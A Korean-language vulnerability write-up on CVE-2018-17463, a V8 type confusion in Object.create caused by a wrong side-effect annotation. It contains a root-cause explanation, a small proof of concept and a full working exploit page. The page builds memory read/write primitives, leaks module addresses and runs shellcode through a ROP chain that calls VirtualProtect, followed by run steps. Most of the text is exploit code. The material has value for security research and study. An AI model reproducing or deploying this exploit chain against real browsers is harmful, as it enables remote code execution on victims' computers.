# Object.create Type-Confusion

## Information
- CVE : 2018-17463
- 설명 : Incorrect side effect annotation in V8 in Google Chrome prior to 70.0.3538.64 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.
- 해당 소프트웨어 : Chrome (on Windows 10)
- 해당 버전 : prior to Chrome 70.0.3538.64
- 취약점 유형 : Remote Code Execution

## Root Cause
Root cause는 다음과 같은 코드에서 발생한다.
```javascript
V(CreateObject, Operator::kNoWrite, 1, 1)
```
위 코드의 `Operator::kNoWrite` property의 경우 optimizer에게 해당 object의 side-effect가 없다고 알려준다. 따라서 해당 flag를 가진 object의 경우 optimization 과정에서 side-effect check routine을 따르지 않게 된다. 이때 side-effect는 말 그대로 프로그래머가 의도한 행위 이외의 다른 부작용을 의미한다.

하지만 `CreateObject`는 첫번째 인자로 전달된 object가 처음 prototype 형태의 인자로 사용된 경우 해당 object의 property를 변경한다. 여기에서 side-effect가 발생한다.
```javascript
// Object v is PropertyArray
let v = {x: 0x1337, y: 0xcafe};
%DebugPrint(v);
Object.create(v);
%DebugPrint(v);
```
위의 코드를 실행해보면 Object.create가 호출된 이후 v가 FastProperties에서 DictionaryProperties로 변경됨을 알 수 있다. 이와 같이 side-effect가 발생함에도 불구하고 앞서 언급했듯이 `kNoWrite` flag를 설정해놨기 때문에 이부분에서 **TypeConfusion**이 발생한다.

## PoC
### poc.js
```javascript
(function() {
 function f(o) {
 let a = o.y; // 21
 Object.create(o);
 return o.x + a; // o.x + 21
 }
 f({ x : 42, y : 21 });
 f({ x : 42, y : 21 });
 // type feedback -> x, y is signed SMI
 %OptimizeFunctionOnNextCall(f);
 let val = f({ x : 42, y : 21 });
 // expect 63
 // but, output is 21
 console.log(val);
})();
```

### exploit.html
```html
<!DOCTYPE html>
<html>
    <head>
        <script>
        log = console.log;
        print = alert;

        // We need some space later
        let scratch = new ArrayBuffer(0x100000);
        let scratch_u8 = new Uint8Array(scratch);
        let scratch_u64 = new BigUint64Array(scratch);
        scratch_u8.fill(0x41, 0, 10);

        let shellcode = new Uint8Array(4);
        shellcode[0] = 0xcc;
        shellcode[1] = 0xbe;
        shellcode[2] = 0x20;
        shellcode[3] = 0x18;

        let ab = new ArrayBuffer(8);
        let floatView = new Float64Array(ab);
        let uint64View = new BigUint64Array(ab);
        let uint8View = new Uint8Array(ab);

        Number.prototype.toBigInt = function toBigInt() {
            floatView[0] = this;
            return uint64View[0];
        };

        BigInt.prototype.toNumber = function toNumber() {
            uint64View[0] = this;
            return floatView[0];
        };

        function hex(n) {
            return '0x' + n.toString(16);
        };

        function fail(s) {
            print('FAIL ' + s);
            throw null;
        }

        const NUM_PROPERTIES = 32;
        const MAX_ITERATIONS = 100000;

        function gc() {
            for (let i = 0; i < 200; i++) {
                new ArrayBuffer(0x100000);
            }
        }

        function make(properties) {
            let o = {inline: 42}      // TODO
            for (let i = 0; i < NUM_PROPERTIES; i++) {
                eval(`o.p${i} = properties[${i}];`);
            }
            return o;
        }

        function pwn() {
            function find_overlapping_properties() {
                let propertyNames = [];
                for (let i = 0; i < NUM_PROPERTIES; i++) {
                    propertyNames[i] = `p${i}`;
                }
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\n')}
                        return [${propertyNames.join(', ')}];
                    }
                `);

                let propertyValues = [];
                for (let i = 1; i < NUM_PROPERTIES; i++) {
                    propertyValues[i] = -i;
                }

                for (let i = 0; i < MAX_ITERATIONS; i++) {
                    let r = vuln(make(propertyValues));
                    if (r[1] !== -1) {
                        for (let i = 1; i < r.length; i++) {
                            if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
                                return [i, -r[i]];
                            }
                        }
                    }
                }

                fail("Failed to find overlapping properties");
            }

            function addrof(obj) {
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        return o.p${p1}.x1;
                    }
                `);

                let propertyValues = [];
                propertyValues[p1] = {x1: 13.37, x2: 13.38};
                propertyValues[p2] = {y1: obj};

                let i = 0;
                for (; i < MAX_ITERATIONS; i++) {
                    let res = vuln(make(propertyValues));
                    if (res !== 13.37)
                        return res.toBigInt()
                }

                fail("Addrof failed");
            }

            function corrupt_arraybuffer(victim, newValue) {
                eval(`
                    function vuln(o) {
                        let a = o.inline;
                        this.Object.create(o);
                        let orig = o.p${p1}.x2;
                        o.p${p1}.x2 = ${newValue.toNumber()};
                        return orig;
                    }
                `);

                let propertyValues = [];
                let o = {x1: 13.37, x2: 13.38};
                propertyValues[p1] = o;
                propertyValues[p2] = victim;

                for (let i = 0; i < MAX_ITERATIONS; i++) {
                    o.x2 = 13.38;
                    let r = vuln(make(propertyValues));
                    if (r !== 13.38)
                        return r.toBigInt();
                }

                fail("Corrupt ArrayBuffer failed");
            }

            let [p1, p2] = find_overlapping_properties();
            log(`[+] Properties p${p1} and p${p2} overlap after conversion to dictionary mode`);

            let memview_buf = new ArrayBuffer(1024);
            let driver_buf = new ArrayBuffer(1024);

            gc();


            let memview_buf_addr = addrof(memview_buf);
            memview_buf_addr--;
            log(`[+] ArrayBuffer @ ${hex(memview_buf_addr)}`);

            let original_driver_buf_ptr = corrupt_arraybuffer(driver_buf, memview_buf_addr);

            let driver = new BigUint64Array(driver_buf);
            let original_memview_buf_ptr = driver[4];

            let memory = {
                write(addr, bytes) {
                    driver[4] = addr;
                    let memview = new Uint8Array(memview_buf);
                    memview.set(bytes);
                },
                read(addr, len) {
                    driver[4] = addr;
                    let memview = new Uint8Array(memview_buf);
                    return memview.subarray(0, len);
                },
                readPtr(addr) {
                    driver[4] = addr;
                    let memview = new BigUint64Array(memview_buf);
                    return memview[0];
                },
                writePtr(addr, ptr) {
                    driver[4] = addr;
                    let memview = new BigUint64Array(memview_buf);
                    memview[0] = ptr;
                },
                addrof(obj) {
                    memview_buf.leakMe = obj;
                    let props = this.readPtr(memview_buf_addr + 8n);
                    return this.readPtr(props + 15n) - 1n;
                },
            };

            let div = document.createElement('div');
            let div_addr = memory.addrof(div);
            //alert('div_addr = ' + hex(div_addr));
            let el_addr = memory.readPtr(div_addr + 0x20n);
            let leak = memory.readPtr(el_addr);

            let chrome_child = leak - 0x40b5f20n;
            //print('chrome_child @ ' + hex(chrome_child));
            // CreateEventW
            let kernel32 = memory.readPtr(chrome_child + 0x4771260n) - 0x20750n;
            //print('kernel32 @ ' + hex(kernel32));
            // NtQueryEvent
            let ntdll = memory.readPtr(kernel32 + 0x79208n) - 0x9a9a0n;
            //print('ntdll @ ' + hex(ntdll));

            /*
            00007ff9`296f0705 488b5150        mov     rdx,qword ptr [rcx+50h]
            00007ff9`296f0709 488b6918        mov     rbp,qword ptr [rcx+18h]
            00007ff9`296f070d 488b6110        mov     rsp,qword ptr [rcx+10h]
            00007ff9`296f0711 ffe2            jmp     rdx
            */

            let gadget = ntdll + 0xA0705n;
            //let gadget = 0x41414141n;

            let pop_gadgets = [
                chrome_child + 0x36a657n, // pop rcx ; ret     59 c3
                chrome_child + 0x9962n, // pop rdx ; ret       5a c3
                chrome_child + 0xc72852n, // pop r8 ; ret      41 58 c3
                chrome_child + 0xc51425n, // pop r9 ; ret      41 59 c3
            ];

            let scratch_addr = memory.readPtr(memory.addrof(scratch) + 0x20n);

            let sc_offset = 0x20000n - scratch_addr % 0x1000n;
            let sc_addr = scratch_addr + sc_offset
            scratch_u8.set(shellcode, Number(sc_offset));

            scratch_u64.fill(gadget, 0, 100);
            //scratch_u64.fill(0xdeadbeefn, 0, 100);

            let fake_vtab = scratch_addr;
            let fake_stack = scratch_addr + 0x10000n;

            let stack = [
                pop_gadgets[0],
                sc_addr,
                pop_gadgets[1],
                0x1000n,
                pop_gadgets[2],
                0x40n,
                pop_gadgets[3],
                scratch_addr,
                kernel32 + 0x193d0n, // VirtualProtect
                sc_addr,
            ];
            for (let i = 0; i < stack.length; ++i) {
                scratch_u64[0x10000/8 + i] = stack[i];
            }

            memory.writePtr(el_addr + 0x10n, fake_stack); // RSP
            memory.writePtr(el_addr + 0x50n, pop_gadgets[0] + 1n); // RIP = ret
            memory.writePtr(el_addr + 0x58n, 0n);
            memory.writePtr(el_addr + 0x60n, 0n);
            memory.writePtr(el_addr + 0x68n, 0n);
            memory.writePtr(el_addr, fake_vtab);

            // Trigger virtual call
            div.dispatchEvent(new Event('click'));

            // We are done here, repair the corrupted array buffers
            let addr = memory.addrof(driver_buf);
            memory.writePtr(addr + 32n, original_driver_buf_ptr);
            memory.writePtr(memview_buf_addr + 32n, original_memview_buf_ptr);
        }

        alert("Press OK to pwn");
        pwn();
        </script>
    </head>
    <body>
    </body>
</html>
```

## How to run exploit?
1) 취약한 Chrome version download
2) --no-sandbox option으로 chrome 실행
3) exploit.html open

## Reference
- [Issue 888923](https://bugs.chromium.org/p/chromium/issues/detail?id=888923)